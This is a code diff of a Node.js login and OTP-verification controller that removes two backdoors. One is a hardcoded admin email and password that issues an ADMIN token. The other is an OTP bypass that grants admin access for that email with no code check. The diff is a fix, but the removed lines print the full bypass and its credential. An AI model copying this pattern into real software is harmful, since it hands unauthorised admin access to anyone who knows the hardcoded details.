@@ -62,29 +62,6 @@ const login = async (req, res) => {
     try {
         const { email, password } = req.body;
 
-        // Hardcoded admin bypass
-        if (email === "admin@taskManager.com" && password === "IallwasysRocks@999") {
-            let data = await findUserDetails(email);
-            if (!data) {
-                // Provide mock admin data if not in DB
-                data = {
-                    _id: "663c9b7e7a8e8a001c123456",
-                    name: "System Admin",
-                    email: email,
-                    role: "ADMIN"
-                };
-            }
-            const token = genrerateToken(data._id, email, data.role);
-            res.cookie("token", token, {
-                httpOnly: true,
-                secure: true,
-                sameSite: 'lax',
-                maxAge: 24 * 60 * 60 * 1000,
-            });
-            const responseData = data.toObject ? data.toObject() : data;
-            return res.status(200).json({ ...responseData, token });
-        }
-
         const data = await findUserDetails(email)
         if (!data) {
             return res.status(404).json({
@@ -269,30 +246,7 @@ const otpVerification = async (req, res) => {
             }
         }
 
-        // Admin bypass for OTP verification
-        if (email === "admin@taskManager.com") {
-            let data = await findUserDetails(email);
-            if (!data) {
-                // Provide mock admin data if not in DB
-                data = {
-                    _id: "663c9b7e7a8e8a001c123456",
-                    name: "System Admin",
-                    email: email,
-                    role: "ADMIN"
-                };
-            }
-            const token = genrerateToken(data._id, email, data.role);
-            res.cookie("token", token, {
-                httpOnly: true,
-                secure: true,
-                sameSite: 'lax',
-                maxAge: 24 * 60 * 60 * 1000,
-            });
-            return res.status(200).json({
-                msg: "OTP Verification Successfull",
-                data
-            });
-        }
+
 
         const systemotp = otpStore.get(email);
         const data = await findUserDetails(email)
